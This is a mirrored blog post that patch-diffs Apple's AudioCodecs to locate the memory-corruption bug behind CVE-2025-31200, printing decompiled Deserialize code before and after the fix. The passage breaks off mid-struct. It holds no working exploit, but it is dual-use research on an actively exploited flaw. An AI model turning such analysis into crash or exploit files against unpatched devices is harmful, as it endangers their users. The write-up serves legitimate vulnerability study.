<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.noahhw.dev/posts/cve-2025-31200/">Original</a>
    <h1>CVE 2025 31200</h1>
    
    <div id="readability-page-1" class="page"><div>
  <h2 id="background">Background</h2>
<p>On April 16, 2025, Apple released a patch for a bug in CoreAudio which they said was <a href="https://support.apple.com/en-us/122282">“Actively exploited in the wild.”</a> This flew under the radar a bit. <a href="https://blog.epsilon-sec.com/cve-2025-31201-rpac.html">Epsilon’s blog</a> has a great writeup of the other bug that was presumably exploited in this chain: a bug in RPAC. The only thing out there that I am aware of about the CoreAudio side of the bug is a video by Billy Ellis (it’s great. I’m featured. You should watch…you’re probably here from that anyways). As he mentioned in the video, “Another security researcher by the name of ‘Noah’ was able to <em>tweak</em> the values such that when it was played on MacOS, it actually did lead to a crash.” I think it’s still worth it to write about that ‘tweaking’ process in more detail.</p>
<p>I had just finished another project and ended up on a <a href="https://docs.google.com/spreadsheets/u/0/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit">spreadsheet</a> maintained by Project Zero which tracks zero days that have been actively exploited in the wild. It just so happened that <em>that</em> day there had been another addition: CVE-2025-31200. I couldn’t find any writeups on it, or really any information other than the fact that it was a “memory corruption in CoreAudio” so I decided to have a look myself. How hard could it be?</p>
<p>There was a bit of a rocky start. I don’t have IDA Pro so my options for binary diffing are limited. Billy mentions Diaphora in his video, and that does seem like the industry standard. Apparently it also has a Ghidra plugin, but I don’t want that Java stink on my laptop. So I had to do things the old-fashioned way. Luckily there is an awesome tool called ipsw maintained by Blacktop. One of its primary use cases is diffing between different versions of iOS. There is even a <a href="https://github.com/blacktop/ipsw-diffs">repo</a> where markdown versions of the diffs are posted, so it was trivial for me to have a look at that. There were a relatively small number of updates, and it was clear that the ones related to this bug were in AudioCodecs.</p>

<p>A 20 byte increase in the __text section is exactly the kind of change you’d expect from a memory corruption like this, so I thought I would crack open the new and the old versions in Binary Ninja and the change would be obvious. First however, I had to actually do the binary diffing. Ipsw-diff is great for basic info like this, but it’s not a disassembler, so it doesn’t show any code-level changes. In order to do the actual diffing I used radiff2 from Radare2.</p>
<p>I fully expected this binary to be a part of the Dyld shared cache. However, if you pay close attention to the path from ipsw-diff, you can see that it isn’t. It lives in <code>/System/Library/Components/AudioCodecs.component/</code>. That’s <em>Components</em> not <em>Frameworks.</em> I don’t know what the difference between them is. Regardless, AudioCodecs on macOS is not part of the shared cache. I collected both the old and the new binaries and ran them through radiff2.</p>
<h2 id="the-diff">The Diff</h2>
<p>Radiff2 spit out a few candidate functions for me to study more closely. Most of them just had compiler entropy differences (think registers shifting around) or different addresses since the text section had shifted. Luckily, one function stuck out as the obvious candidate: <code>apac::hoa::CodecConfig::Deserialize(this, bitStreamReader)</code>, presumably a C++ (you can tell by the ‘::’) member method of the CodecConfig class. There were a number of logical changes, a new error message, and a new check all clearly visible at the bottom of the method. I thought that the bug would now be trivial to spot since the changes seemed self-contained enough, and often it’s the followup—not the actual exploit primitive itself—that takes most of the ingenuity.</p>
<p>I stared for a while at the difference between the old and new Deserialize method. I even took the time to manually copy and paste them out into VSCode and use its built-in diffing functionality. I could tell that a lot of it was the same. The method consists in a series of reads from a bitstream, each having their own failure cases and control flow. It looks like a relatively typical parsing method. The high level flow is a series of blocks that look like this:</p>
<ol>
<li>Read some bits from the stream with the bitStreamReader</li>
<li>Check some error conditions</li>
<li>If failure then log failure and exit</li>
<li>If success then advance the pointer and continue to the next block</li>
</ol>
<p>The section that differed was the final read from the stream. In it there were repeated snippets like this meant to read in the length of some array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>// Access 
</span></span></span><span><span> 2</span><span><span></span><span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0x78</span><span>;</span>
</span></span><span><span> 3</span><span>
</span></span><span><span> 4</span><span><span>// Read the opcode stored at section[0]
</span></span></span><span><span> 5</span><span><span></span><span>uint32_t</span> <span>opcode</span> <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 6</span><span><span>int32_t</span>  <span>elementCount</span><span>;</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>// If opcode == 0x10000, count all set-bits in the next 8 bytes of data
</span></span></span><span><span>10</span><span><span></span>    <span>// (i.e., the two uint32_t elements section[1] and section[2])
</span></span></span><span><span>11</span><span><span></span>    <span>uint8x8_t</span> <span>raw_bytes</span>     <span>=</span> <span>vld1_u8</span><span>((</span><span>uint8_t</span> <span>*</span><span>)</span><span>&amp;</span><span>section</span><span>[</span><span>1</span><span>]);</span> <span>// uint8x8_t is a NEON intrinsic vector type holding 8 unsigned 8-bit values
</span></span></span><span><span>12</span><span><span></span>    <span>uint8x8_t</span> <span>popcounts</span>     <span>=</span> <span>vcnt_u8</span><span>(</span><span>raw_bytes</span><span>);</span>
</span></span><span><span>13</span><span>    <span>uint64_t</span>  <span>total_bits</span>    <span>=</span> <span>vaddlv_u8</span><span>(</span><span>popcounts</span><span>);</span>
</span></span><span><span>14</span><span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>total_bits</span><span>;</span>
</span></span><span><span>15</span><span><span>}</span>
</span></span><span><span>16</span><span><span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>17</span><span>    <span>// If opcode is nonzero, use its low 16 bits
</span></span></span><span><span>18</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span>19</span><span><span>}</span>
</span></span><span><span>20</span><span><span>else</span> <span>{</span>
</span></span><span><span>21</span><span>    <span>// Otherwise, fall back to the third array element
</span></span></span><span><span>22</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>23</span><span><span>}</span>
</span></span><span><span>24</span><span><span>//do stuff with elementCount
</span></span></span></code></pre></div><p>Then, also common between them (within the differing sections) was a little floating point dance to compute the bit width of the array entries (bitWidth) that would later be read in from the stream.</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>v0_3</span> <span>=</span> <span>(</span><span>float</span><span>)</span><span>remappingEntries</span><span>;</span>
</span></span><span><span>2</span><span><span>int128_t</span> <span>v0_4</span><span>;</span>
</span></span><span><span>3</span><span><span>v0_4</span> <span>=</span> <span>(</span><span>double</span><span>)</span><span>_log2f</span><span>(</span><span>v0_3</span><span>);</span>
</span></span><span><span>4</span><span><span>v0_4</span> <span>=</span> <span>v0_4</span> <span>+</span> <span>-</span><span>0.0001</span><span>;</span>
</span></span><span><span>5</span><span><span>v0_4</span> <span>=</span> <span>(</span><span>float</span><span>)</span><span>v0_4</span><span>;</span>
</span></span><span><span>6</span><span><span>uint32_t</span> <span>bitWidth</span> <span>=</span> <span>vcvtps_u32_f32</span><span>(</span><span>v0_4</span><span>);</span></span></span></code></pre></div><p>Essentially <code>floor(log₂(elementCount))</code>.  In both versions there is some code that computes the size of an array. It uses the number of required elements, and the current size of the array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>currentSize</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>	<span>resize</span><span>(</span><span>arr</span><span>,</span> <span>elementCount</span> <span>-</span> <span>currentSize</span><span>);</span>
</span></span><span><span>3</span><span><span>}</span>
</span></span><span><span>4</span><span><span>else</span> <span>if</span> <span>(</span><span>currentSize</span> <span>&gt;</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>5</span><span>	<span>current_arr_end_ptr</span> <span>-=</span> <span>(</span><span>currentSize</span> <span>-</span> <span>elementCount</span><span>)</span>
</span></span><span><span>6</span><span><span>}</span></span></span></code></pre></div><p>The rest of the respective final reads were different. In the old version, it uses the <code>elementCount</code>as computed above. In the new version it uses some field of the <code>this</code> pointer:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>uint64_t</span> <span>elementCount</span> <span>=</span> <span>(</span><span>uint64_t</span><span>)</span><span>*</span><span>(</span><span>uint32_t</span><span>*</span><span>)((</span><span>char</span><span>*</span><span>)</span><span>this</span> <span>+</span> <span>0x58</span><span>);</span></span></span></code></pre></div><p>This was an important clue. I figured if I just traced through the rest of the code, then there would be some write into the <code>elementCount</code>-sized array with a size check based on <code>this+0x58</code>, rather than <code>elementCount</code>. That would be the primitive. Here is the chunk of the code that reads from the stream and writes in to the array:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>size_t</span>     <span>index</span>       <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 2</span><span><span>uint8_t</span>    <span>lastSymbol</span><span>;</span>
</span></span><span><span> 3</span><span><span>int32_t</span>    <span>limit</span><span>;</span>
</span></span><span><span> 4</span><span>
</span></span><span><span> 5</span><span><span>do</span> <span>{</span>
</span></span><span><span> 6</span><span>    <span>// Same exact section as before: computing how many entries we need in our array
</span></span></span><span><span> 7</span><span><span></span>    <span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>off_0x78</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>uint32_t</span>  <span>opcode</span>  <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 9</span><span>    <span>int32_t</span>   <span>elementCount</span><span>;</span>
</span></span><span><span>10</span><span>    
</span></span><span><span>11</span><span>    <span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span>12</span><span>		    <span>uint8x8_t</span> <span>raw_bytes</span>     <span>=</span> <span>vld1_u8</span><span>((</span><span>uint8_t</span> <span>*</span><span>)</span><span>&amp;</span><span>section</span><span>[</span><span>1</span><span>]);</span> 
</span></span><span><span>13</span><span>		    <span>uint8x8_t</span> <span>popcounts</span>     <span>=</span> <span>vcnt_u8</span><span>(</span><span>raw_bytes</span><span>);</span>
</span></span><span><span>14</span><span>		    <span>uint64_t</span>  <span>total_bits</span>    <span>=</span> <span>vaddlv_u8</span><span>(</span><span>popcounts</span><span>);</span>
</span></span><span><span>15</span><span>		    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>total_bits</span><span>;</span>
</span></span><span><span>16</span><span>    <span>}</span>
</span></span><span><span>17</span><span>    <span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>18</span><span>        <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span>19</span><span>    <span>}</span>
</span></span><span><span>20</span><span>    <span>else</span> <span>{</span>
</span></span><span><span>21</span><span>        <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>22</span><span>    <span>}</span>
</span></span><span><span>23</span><span>    <span>// Check #1 if index &gt;= expected elements
</span></span></span><span><span>24</span><span><span></span>    <span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>(</span><span>uint64_t</span><span>)</span><span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>25</span><span>        <span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>26</span><span>        <span>goto</span> <span>loop_end</span><span>;</span>
</span></span><span><span>27</span><span>    <span>}</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>    <span>uint32_t</span> <span>BitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>;</span>
</span></span><span><span>30</span><span>    <span>BitstreamReader</span> <span>*</span><span>reader</span> <span>=</span> <span>TBitstreamReader</span><span>*</span><span>;</span>
</span></span><span><span>31</span><span>    <span>uint32_t</span> <span>value</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>32</span><span>
</span></span><span><span>33</span><span>    <span>if</span> <span>(</span><span>BitWidth</span> <span>&lt;=</span> <span>32</span><span>)</span> <span>{</span>
</span></span><span><span>34</span><span>        <span>uint32_t</span> <span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>
</span></span><span><span>35</span><span>        <span>uint32_t</span> <span>bitOffset</span>   <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span>
</span></span><span><span>36</span><span>
</span></span><span><span>37</span><span>        <span>if</span> <span>(</span><span>bitOffset</span> <span>&gt;=</span> <span>bitWidth</span><span>)</span> <span>{</span> <span>// More bits in cache than the size of an element
</span></span></span><span><span>38</span><span><span></span>            <span>value</span> <span>=</span> <span>cache</span> <span>&lt;&lt;</span> <span>BitWidth</span><span>;</span>
</span></span><span><span>39</span><span>            <span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>-</span> <span>BitWidth</span><span>;</span>
</span></span><span><span>40</span><span>        <span>}</span>
</span></span><span><span>41</span><span>        <span>else</span> <span>{</span>
</span></span><span><span>42</span><span>        	  <span>// Refill the cache and do some housekeeping
</span></span></span><span><span>43</span><span><span></span>            <span>TBitstreamReader_FillCache</span><span>(</span><span>reader</span><span>);</span>               
</span></span><span><span>44</span><span>            <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>+=</span> <span>4</span><span>;</span> 
</span></span><span><span>45</span><span>            <span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>          
</span></span><span><span>46</span><span>            <span>bitOffset</span>    <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span> 
</span></span><span><span>47</span><span>
</span></span><span><span>48</span><span>            <span>value</span> <span>|=</span> <span>(</span><span>cache</span> <span>&gt;&gt;</span> <span>bitOffset</span><span>);</span> <span>// Shift right by the old offset to get just BitWidth bits from the cache
</span></span></span><span><span>49</span><span><span></span>            <span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>+</span> <span>32</span><span>;</span> <span>// I believe 32 because 32 bits in a byte and we advance the reader ptr with bytes
</span></span></span><span><span>50</span><span><span></span>
</span></span><span><span>51</span><span>            <span>if</span> <span>(</span><span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>52</span><span>                <span>value</span> <span>=</span> <span>0</span><span>;</span> 
</span></span><span><span>53</span><span>            <span>}</span>
</span></span><span><span>54</span><span>            <span>else</span> <span>{</span>
</span></span><span><span>55</span><span>                <span>value</span> <span>|=</span> <span>(</span><span>cache</span> <span>&lt;&lt;</span> <span>-</span><span>bitOffset</span><span>;</span>
</span></span><span><span>56</span><span>            <span>}</span>
</span></span><span><span>57</span><span>        <span>}</span>
</span></span><span><span>58</span><span>        <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>value</span><span>;</span>
</span></span><span><span>59</span><span>    <span>}</span>
</span></span><span><span>60</span><span>
</span></span><span><span>61</span><span>    <span>uint8_t</span> <span>*</span><span>outbuf</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xe0</span><span>;</span>
</span></span><span><span>62</span><span>    <span>outbuf</span><span>[</span><span>index</span><span>]</span>   <span>=</span> <span>(</span><span>uint8_t</span><span>)</span><span>value</span><span>;</span>
</span></span><span><span>63</span><span>
</span></span><span><span>64</span><span>    <span>index</span><span>++</span><span>;</span>
</span></span><span><span>65</span><span>
</span></span><span><span>66</span><span><span>}</span> <span>while</span> <span>(</span><span>value</span> <span>&gt;</span> <span>elementCount</span><span>);</span> <span>// Check #2: this time that the value *from the stream* &lt;= elementCount
</span></span></span><span><span>67</span><span><span></span><span>return</span> <span>result</span><span>;</span></span></span></code></pre></div><p>I don’t know about you, but I don’t spot the bug here. To help you along, here is the same section similarly cleaned-up from the patched version:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>// A new check here with this + 0x58 rather than elementCount
</span></span></span><span><span> 2</span><span><span>// Calling it desiredCount to emphasize the difference
</span></span></span><span><span> 3</span><span><span></span><span>if</span> <span>(</span><span>desiredCount</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span> 4</span><span><span>retZeroLabel</span><span>:</span>
</span></span><span><span> 5</span><span>    <span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0x78</span><span>;</span>
</span></span><span><span> 6</span><span>    <span>uint32_t</span> <span>opcode</span>  <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 7</span><span>    <span>int32_t</span>  <span>elementCount</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 9</span><span>			<span>/*
</span></span></span><span><span>10</span><span><span>			This section repeated again yielding ElementCount
</span></span></span><span><span>11</span><span><span>			*/</span>
</span></span><span><span>12</span><span>    <span>}</span>
</span></span><span><span>13</span><span>    <span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>desiredCount</span><span>)</span> <span>{</span> 
</span></span><span><span>14</span><span>        <span>uint32_t</span> <span>BitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>;</span>
</span></span><span><span>15</span><span>        <span>TBitstreamReader_SkipBits</span><span>(</span><span>reader</span><span>,</span> <span>// New call to SkipBits
</span></span></span><span><span>16</span><span><span></span>            <span>(</span><span>uint64_t</span><span>)(</span><span>elementCount</span> <span>-</span> <span>desiredCount</span><span>)</span> <span>*</span> <span>BitWidth</span><span>);</span>
</span></span><span><span>17</span><span>    <span>}</span>
</span></span><span><span>18</span><span>    <span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>19</span><span><span>}</span>
</span></span><span><span>20</span><span><span>else</span> <span>{</span>
</span></span><span><span>21</span><span>    <span>// Populate the array from the stream
</span></span></span><span><span>22</span><span><span></span>    <span>int64_t</span> <span>index</span>  <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>23</span><span>    <span>uint8_t</span> <span>symbol</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>24</span><span>
</span></span><span><span>25</span><span>    <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
</span></span><span><span>26</span><span>        <span>uint32_t</span> <span>bitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>);</span>
</span></span><span><span>27</span><span>        <span>uint32_t</span> <span>value</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>        <span>if</span> <span>(</span><span>bitWidth</span> <span>&lt;=</span> <span>32</span><span>)</span> <span>{</span>
</span></span><span><span>30</span><span>					<span>TBitstreamReader_FillCache</span><span>(</span><span>reader</span><span>);</span>
</span></span><span><span>31</span><span>					<span>reader</span><span>-&gt;</span><span>currentPtr</span> <span>+=</span> <span>4</span><span>;</span>
</span></span><span><span>32</span><span>					<span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>
</span></span><span><span>33</span><span>					
</span></span><span><span>34</span><span>					<span>bitOffset</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span>
</span></span><span><span>35</span><span>					<span>value</span> <span>|=</span> <span>cache</span> <span>&gt;&gt;</span> <span>bitOffset</span><span>;</span>
</span></span><span><span>36</span><span>					
</span></span><span><span>37</span><span>					<span>// Update bit offset
</span></span></span><span><span>38</span><span><span></span>					<span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>+</span> <span>32</span><span>;</span>
</span></span><span><span>39</span><span>					
</span></span><span><span>40</span><span>					<span>// Check if we need more bits
</span></span></span><span><span>41</span><span><span></span>					<span>if</span> <span>(</span><span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>42</span><span>					    <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>43</span><span>					<span>}</span> 
</span></span><span><span>44</span><span>					<span>else</span> <span>{</span>
</span></span><span><span>45</span><span>					    <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>cache</span> <span>&lt;&lt;</span> <span>-</span><span>(</span><span>bitOffset</span><span>);</span>
</span></span><span><span>46</span><span>						<span>}</span>
</span></span><span><span>47</span><span>	        <span>}</span>
</span></span><span><span>48</span><span>	        <span>char</span> <span>*</span><span>outBuf</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xE0</span><span>;</span>
</span></span><span><span>49</span><span>	        <span>outBuf</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
</span></span><span><span>50</span><span>
</span></span><span><span>51</span><span>	        <span>if</span> <span>((</span><span>uint32_t</span><span>)</span><span>value</span> <span>&gt;=</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>52</span><span>	            <span>break</span><span>;</span> <span>// Same as check #2 before
</span></span></span><span><span>53</span><span><span></span>	        <span>}</span>
</span></span><span><span>54</span><span>	
</span></span><span><span>55</span><span>	        <span>index</span><span>++</span><span>;</span>
</span></span><span><span>56</span><span>	        <span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>57</span><span>	            <span>goto</span> <span>retZeroLabel</span><span>;</span>
</span></span><span><span>58</span><span>	        <span>}</span>
</span></span><span><span>59</span><span>    <span>}</span>
</span></span><span><span>60</span><span>    <span>if</span> <span>(</span><span>_os_log_type_enabled</span><span>(</span><span>__os_log_default</span><span>,</span> <span>OS_LOG_LEVEL_ERROR</span><span>))</span> <span>{</span>
</span></span><span><span>61</span><span>        <span>os_log_error</span><span>(</span><span>&#34;HOAStructs.cpp:%d Invalid m_RemappingArray bitstream %u (&gt;= %u)&#34;</span><span>,</span>
</span></span><span><span>62</span><span>                     <span>__LINE__</span><span>,</span> <span>symbol</span><span>,</span> <span>elementCount</span><span>);</span> <span>// New error message
</span></span></span><span><span>63</span><span><span></span>    <span>}</span>
</span></span><span><span>64</span><span>    <span>result</span> <span>=</span> <span>1</span><span>;</span>
</span></span><span><span>65</span><span><span>}</span>
</span></span><span><span>66</span><span><span>return</span> <span>result</span><span>;</span></span></span></code></pre></div><p>It is essentially the same, but with a new check, a new call to <code>skipBits</code>, and a new error message. After seeing the new error message, I figured that that must be it! Whatever control flow leads to the new error message in the patched version has got to be the control flow that induces the error. The following must hold in order to reach the new check:</p>
<ol>
<li><code>desiredCount</code> ≠ 0. This takes us to the loop that tries to populate the array. The code is trying to populate an array with values read in from a stream. It is getting the <em>number</em> of those values prior (in the patched version that is <code>desiredCount</code>). If that number is zero then we’re good! We don’t need to try to populate the array and we don’t need to throw any error messages.</li>
<li>At some point while reading from the stream, <code>value</code> should be ≥ <code>elementCount</code>.</li>
</ol>
<p>(1) is trivial to induce. Consider that path in the vulnerable code. There is never a check for whether or not <code>elementCount</code> == 0. It is simply used to size the array and then the loop begins. So any audio file that reaches this code will “go down that path” in the old version. This was actually my first guess about the bug because the check whether or not <code>elementCount</code> == 0 stood out as the first big control-flow difference. In the old version, no resizing happens at all if <code>elementCount</code> == 0:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>currentSize</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>resize</span><span>(</span><span>arr</span><span>,</span> <span>elementCount</span> <span>-</span> <span>currentSize</span><span>);</span>
</span></span><span><span> 3</span><span><span>}</span>
</span></span><span><span> 4</span><span><span>else</span> <span>if</span> <span>(</span><span>currentSize</span> <span>&gt;</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span> 5</span><span>	<span>current_arr_end_ptr</span> <span>-=</span> <span>(</span><span>currentSize</span> <span>-</span> <span>elementCount</span><span>)</span>
</span></span><span><span> 6</span><span><span>}</span> <span>// Continue without resizing the array
</span></span></span><span><span> 7</span><span><span>// ...
</span></span></span><span><span> 8</span><span><span>// End up here and exit
</span></span></span><span><span> 9</span><span><span></span><span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>(</span><span>uint64_t</span><span>)</span><span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>10</span><span>	<span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>11</span><span>	<span>goto</span> <span>loop_end</span><span>;</span>
</span></span><span><span>12</span><span><span>}</span></span></span></code></pre></div><p>But there is no bug in that condition. If <code>elementCount</code> were zero here, then that would mean that there are no elements required to be in the array, so no resizing happens. The loop exits immediately at the check <code>(uint64_t)index &gt;= (uint64_t)elementCount</code> since <code>elementCount</code> is initialized to 0.</p>
<p>We also need (2) to be true: value &gt; <code>elementCount</code>, and that’s seemingly possible. Of course, we don’t know how exactly to trigger it yet, but we do know that <code>value</code> is read in from an attacker controlled stream, and plausibly that it can have values higher than <code>elementCount</code> given that there is a check for it. However, it is still unclear what the memory corruption actually is.  Even if we read in some value from the stream that is greater than <code>elementCount</code>, we never can actually overwrite anything in <code>outBuf</code>, since <code>outBuf</code> is sized properly based on <code>elementCount</code>. Clearly the change was related to the sizing of <code>outBuf</code> though, so how do we make sense of this? At this point I had a few hypotheses:</p>
<ol>
<li>I was simply missing how <code>outBuf</code> could be overwritten, and therefore I should spend more time staring at this patch diff until the bug revealed itself to me.</li>
<li>At some point later in the code, the values from the <code>m_RemappingArray</code> are used to size another buffer or array of some kind that is assumed to be the same size as <code>*m_TotalComponents</code>* (used as <code>elementCount</code> in the patched version)<em>.</em></li>
</ol>
<p>I spent a lot of time with (a)—staring and trying to think of ways to make it so just one extra value was read into the <code>m_RemappingArray</code>. Perhaps there was some weirdness with the bit width calculation, or some kind of integer overflow that led to a smaller buffer than expected. But I couldn’t make anything work.</p>
<p>After entirely too much time spent smashing my head into this wall I proceeded to hypotheses (b). I suppose I should have done this from the start: looking at them now, laid out like this it’s so obvious to me which is correct, but it wasn’t at the time.</p>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>I wanted to do some dynamic analysis. In order to do that I needed to understand how to reach the vulnerable code path. So I started reverse engineering.</p>
<p>In AudioCodecs there are parallel methods to deserialize for other classes: <code>apac::spch::CodecConfig::Deserialize</code>, for example, and the name of the binary literally has the words <em>Audio</em> and <em>Codec</em> in the name. That was enough to start googling. After searching something like “APAC Audio format,” I found a lot of results for <em>ALAC</em> (Apple Lossless Audio Codec) which seemed close. I also found this reddit <a href="https://www.reddit.com/r/audiophile/comments/1fncalk/what_is_the_apac_audio_format_as_listed_in_the/">post</a> in r/AudioPhile that was asking what it was, and <a href="https://developer.apple.com/documentation/coreaudiotypes/kaudioformatapac?language=objc">this mention</a> in Apple’s developer documentation for Core Audio Types. After following that one redditor’s guess I found this <a href="https://support.apple.com/en-by/guide/immersive-video-utility/dev4579429f0/web">page</a> which confirms that APAC stands for <em>Apple Positional Audio Codec</em>.</p>
<p>With much less effort, I was able to find out that HOA plausibly stood for Higher Order Ambisonics: a method of representing sound as a spatial sound-field centered  around the listeners head. Something like this:</p>
<p><img alt="Spatial Audio Example" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/ambisonics.jpg"/></p>
<p><a href="https://tricktheear.eu/spatial-web-audio/">https://tricktheear.eu/spatial-web-audio/</a></p>
<p>This helped a tiny bit in understanding the logic here—enough that I went to try and make an audio file that could hit the patched function. After some playing around and downloading a lot of sketchy audio files from the internet, I was able to hit the function through <code>[audioPlayer prepareToPlay]</code>. However, it was still unclear how exactly to reach the exact snippet that had changed.
Luckily at this point I wasn’t the only person working on this, and by searching for some related keywords I stumbled on this Git repo: <a href="https://github.com/zhuowei/apple-positional-audio-codec-invalid-header">https://github.com/zhuowei/apple-positional-audio-codec-invalid-header</a> from Zhouwei. He hadn’t figured it out yet as it said in the README at the time, but he had done some excellent reverse engineering. He put together an objective C++ script and lldb hook that created a .mp4 which hit the vulnerable snippet in the old version and the new check in the patched version. As you can see in his code:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>// Define the relevant pieces of the CodeConfig struct 
</span></span></span><span><span>2</span><span><span></span><span>struct</span> <span>CodecConfig</span> <span>{</span>
</span></span><span><span>3</span><span>  <span>char</span> <span>padding0</span><span>[</span><span>0x78</span><span>];</span>                         <span>// 0
</span></span></span><span><span>4</span><span><span></span>  <span>AudioChannelLayout</span><span>*</span> <span>remappingChannelLayout</span><span>;</span>  <span>// 0x78 - This is of course this-&gt;offset_0x78 from earlier
</span></span></span><span><span>5</span><span><span></span>  <span>char</span> <span>padding1</span><span>[</span><span>0xe0</span> <span>-</span> <span>0x80</span><span>];</span>                  <span>// 0x80
